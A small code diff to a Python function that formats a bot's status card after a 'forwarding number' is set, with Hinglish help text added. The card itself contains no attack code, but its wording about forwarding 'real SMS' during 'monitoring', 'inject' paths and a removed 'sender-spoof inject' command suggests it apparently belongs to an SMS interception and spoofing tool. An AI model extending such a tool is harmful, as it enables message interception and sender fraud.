@@ -530,17 +530,19 @@ def format_inject_stream_card(
     )
 
 
-def format_mynum_set_card(phone: str) -> str:
+def format_mynum_set_card(phone: str, poll_id: str | None = None) -> str:
     from app.services import display_phone
 
     shown = display_phone(phone)
+    poll_line = f"📍 Inject path: messages/{poll_id}\n" if poll_id else ""
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
         "Forwarding Number Set!\n"
-        f"📞 Target: {shown}\n"
-        "Real SMS forwards go here during monitoring.\n"
-        "For sender-spoof inject use /key instead."
+        f"📞 Real SMS -&gt; {shown}\n"
+        f"{poll_line}"
+        "Ab yahi number inject hoga — purana replace ho gaya.\n"
+        "Monitoring ON ho to turant apply; warna /startmonitor ya /injecttest."
         "</pre>"
     )
 
